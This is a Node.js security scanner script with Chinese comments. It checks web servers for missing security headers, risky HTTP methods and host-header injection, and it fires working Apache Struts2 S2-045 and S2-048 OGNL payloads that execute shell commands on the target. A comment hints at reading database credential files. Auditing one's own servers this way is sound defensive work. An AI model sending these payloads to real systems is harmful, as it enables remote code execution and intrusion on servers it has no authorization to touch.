var szMyName = 'M.T.X._2017-06-08',
	request = require('request'),
	urlObj = require('url'),
	net = require('net'),
	url = "",bReDo = false, szLstLocation = "",
	g_oRst = {},
	a = process.argv.splice(2),
	bRunHost = false,
	aHS = "X-Content-Security-Policy,x-frame-options,X-Webkit-CSP,X-XSS-Protection,X-Download-Options".toLowerCase().split(/[,]/);

if(0 < a.length)url = a[0];
process.stdin.setEncoding('utf8');
process.env.NODE_ENV = "production";

// tomcat测试
// https://www.exploit-db.com/exploits/41783/
// /?{{%25}}cake\=1
// /?a'a%5c'b%22c%3e%3f%3e%25%7d%7d%25%25%3ec%3c[[%3f$%7b%7b%25%7d%7dcake%5c=1

// 基于socket发送数据
function fnSocket(h,p,szSend,fnCbk)
{
	const client = net.connect({"port": p,"host":h}, () => 
	{
	  client.write(szSend);
	});
	client.on('data', (data) => 
	{
		fnCbk(data);
		client.end();
	});
	client.on('end', () =>{});
}

// check weblogic T3
// java -jar jfxl.jar 192.168.10.1/24:7001
function checkWeblogicT3(h,p)
{
	var s  = "t3 12.1.2\nAS:2048\nHL:19\n\n";
	fnSocket(h,p,s,function(data)
	{
		var d = data && data.toString().trim() || "", 
			re = /^HELO:(\d+\.\d+\.\d+\.\d+)\./gm;
		console.log(d);
		console.log(re.test(d));
	});
}

// 解析裸头信息
function fnParseHttpHd(s,fnCbk)
{
	var a = s.trim().split(/\n/), obj = {"statusCode":a[0].split(/ /)[1]};
	// if(!(/^\d+$/.test(obj.statusCode))) obj['body'] = s.trim().replace(/[\r\n\t]/gmi, "").replace(/>\s*</gmi, "><");

	for(var i in a)
	{
		// if(0 == i)continue;
		var x = a[i].indexOf(":");
		var aT = [a[i].substr(0, x), a[i].substr(x + 1)];
		
		if(aT[0])
			obj[aT[0].toLowerCase().trim()] = aT[1].trim();
	}
	if(fnCbk)fnCbk(obj);
}

// 伪造host攻击测试
function fnDoHostAttack(url,fnCbk)
{
	if(bRunHost)return;
	bRunHost = true;
	try{
		var uO = urlObj.parse(url), ss = "I.am.summer.M.T.X.T",host = uO.host.split(/:/)[0], port = uO.port || 80;
		if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
		// checkWeblogicT3(host,port);
		fnSocket(host,port,'GET ' + uO.path + ' HTTP/1.1\r\nHost:' + ss + '\r\nUser-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 10_2 like ' + szMyName + ') AppleWebKit/602.3.12 (KHTML, like Gecko) Version/8.0 Mobile/14C92 Safari/602.3.12 MTX/3.0\r\n\r\n',
			function(data)
		{
			var d = data && data.toString().trim() || "";

			fnParseHttpHd(d,function(o)
			{
				var oD = {des:"伪造host攻击测试成功"};
				if(o.location && -1 < String(o.location).indexOf(ss))
				{
					g_oRst["host"] = oD;
					oD.des += ", response返回的location：" + o.location;
				}
				var n = d.indexOf(ss);
				if(-1 < n)
				{
					var rg = new RegExp("(<.*?http:\\/\\/" + ss + ".*?>)","gim");
					var a = rg.exec(d);
					if(a)
					{
						var o = g_oRst["host"] || oD;
						o.code = "返回的代码中存在攻击后的代码:" + a[1];
						g_oRst["host"] = o;
					}
				}
			});
		});
	}catch(e){console.log(e);}
}
// 单个方法测试
function fnTest(s)
{
	request(
	    { method: s ||'PUT'
	    , uri: url//.substr(0,url.lastIndexOf("/"))
	    ,headers:{'Access-Control-Request-Method':'GET,HEAD,POST,PUT,DELETE,CONNECT,OPTIONS,TRACE,PATCH'}
	    , multipart:'HEAD' == s|| 'OPTIONS' == s? null:
	      [ { 'content-type': 'application/json'
	        ,  body: JSON.stringify({foo: 'bar', _attachments: {'test.jsp': {follows: true, length: 18, 'content_type': 'text/plain' }}})
	        }
	      , { body: 'I am an attachment' }
	      ]
	    }
	  , function (error, response, body) {
	  		if(!response)return;
	      	if(response && -1 <  [201,200].indexOf(response.statusCode))
	      	{
	      		// console.log(response.headers);
	      		g_oRst.method || (g_oRst.method = {});
	      		g_oRst.method[s] = "开启了" + s + "、应该关闭，建议仅允许GET、POST";
	      		if(response.headers['allow'])
	      			g_oRst.method['allow'] = "确定这些都是必要的：" + response.headers['allow'];
	      	}
	      	var a = ["x-powered-by","server"];
	      	for(var k in a)
	      	if(!g_oRst[a[k]] && response && response.headers && response.headers[a[k]])
	      		g_oRst[a[k]] = "应该屏蔽 " + response.headers[a[k]];
	      	if(response && response.headers && response.headers["location"])
	      	{
	      		g_oRst["location"] = "建议在服务器端跳转 " + response.headers["location"];
	      		if(szLstLocation != response.headers["location"])
	      		{
	      			szLstLocation = url = response.headers["location"];
	      			fnTestAll();
	      		}
	      	}
	      	for(var k in aHS)
	      	{
	      		if(!response.headers[aHS[k]])
	      		{
	      			g_oRst.safeHeader || (g_oRst.safeHeader = {});
	      			g_oRst.safeHeader[aHS[k]] = "应该有有该安全头信息 " + aHS[k];
	      		}
	      	}

	      	if(response.headers['content-type'])
	      	{
	      		;
	      	}
	    }
	  );
}

var g_postData = null, g_szCmd = "echo whoami:;whoami;echo pwd:;pwd;echo cmdend";
function doStruts2_048(url,cmd,fnCbk)
{
	var szCmd = cmd || g_szCmd;
	var payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." + 
		"(#_memberAccess?(#_memberAccess=#dm):" + 
		"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." + 
		"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" + 
		".(#ognlUtil.getExcludedPackageNames().clear())"+ 
	 	".(#ognlUtil.getExcludedClasses().clear())" + 
		".(#context.setMemberAccess(#dm)))).(#cmd='" + szCmd + "')" + 
		".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))" + 
		".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))" + 
		".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))" + 
		".(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))" + 
		".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"

    // g_postData ||
    var data = {
        "name": g_postData || payload,
        "age": 20
    };
    request({method: 'POST',uri: url,"formData":data,"headers":{Referer:url}},
    	function(e,r,b)
    {
    	fnDoBody(b,"s2-048");
    	// console.log(e || b || r);
    });
}

function myLog(a)
{
	// console.log(String(a.callee))
	var c = a.callee.caller;
	// if(c.arguments && c.arguments.caller)console.log(c.arguments.caller)
	if(a.callee.caller)
	{
		console.log(a.callee.caller.arguments);
		a = a.callee.caller.arguments;
		if(0 < a.length)myLog(a);
	}
}

function fnDoBody(body,t)
{
	body||(body = "");
	if(!body)
	{
		// myLog(arguments);
	}
	var i = body.indexOf("cmdend") || body.indexOf("<!DOCTYPE") || body.indexOf("<html") || body.indexOf("<body");
	if(i) body = body.substr(0, i).trim();
	if(!body)return;
	// console.log(body);
	g_oRst.struts2 || (g_oRst.struts2 = {});
	var oT = g_oRst.struts2 = {},s1 = String(body).split(/\n/);
	oT[t] = "发现struts2高危漏洞" + t + "，请尽快升级";
	if(-1 < body.indexOf("root") && !oT["root"])
		oT["root"] = "中间件不应该用root启动，不符合公司上线检查表要求";
	if(s1[0] && 50 > s1[0].length && !oT["user"])
		oT["user"] = "当前中间件启动的用户：" + (-1 < s1[0].indexOf('whoami')? s1[1]:s1[0]);
	if(1 < s1.length)
		oT["CurDir"] = {des:"当前中间件目录","path":3 < s1.length ? s1[3] : s1[1]};
}


function doStruts2_045(url,cmd,fnCbk)
{
	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
	var szCmd = cmd || g_szCmd;//  && cat #curPath/WEB-INF/jdbc.propertis
	request({method: 'POST',uri: url
	    ,headers:
	    {
	    	"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
	    	"Content-Type":g_postData = 
	    	    ("%{(#nike='multipart/form-data')"
		+ ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" 
		+ ".(#_memberAccess?(#_memberAccess=#dm):" 
			+ "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])" 
			+ ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))"
			+ ".(#ognlUtil.getExcludedPackageNames().clear())"
		+ ".(#ognlUtil.getExcludedClasses().clear())"
		+ ".(#context.setMemberAccess(#dm))))"
		+ ".(#cmd='" + szCmd + "')"
		+ ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))"
		+ ".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))"
		+ ".(#p=new java.lang.ProcessBuilder(#cmds))"
		+ ".(#p.redirectErrorStream(true)).(#process=#p.start())"
		+ ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse()"
		+ ".getOutputStream()))"
	    // 我添加的当前位置行加上后，会无法输出
	    // + ".(#ros.write(@org.apache.struts2.ServletActionContext@getRequest().getServletContext().getRealPath('.').getBytes()))"
		+ ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))"
		+ ".(#ros.flush())}")
	    	    // .(#ros.close())
	    }}
	  , function (error, response, body){
	  		if(body)
	  		{
	  			fnDoBody(body,"s2-045");
	  		}
	  		// console.log(body);
	    }
	  );
}

// 测试所有，便于更改url重复测试
function fnTestAll()
{
	fnDoHostAttack(url,function(o)
	{
		console.log(o);
	},null);
	var aMethod = ["PUT","DELETE","OPTIONS","HEAD", "PATCH"];
	for(var k in aMethod)
		fnTest(aMethod[k]);
}
if(0 < a.length)
{
	doStruts2_045(url);
	doStruts2_048(url);
	fnTestAll();
}
// checkWeblogicT3("192.168.10.133",9001);
process.on('exit', (code) => 
{
	console.log(JSON.stringify(g_oRst,null,' '));
});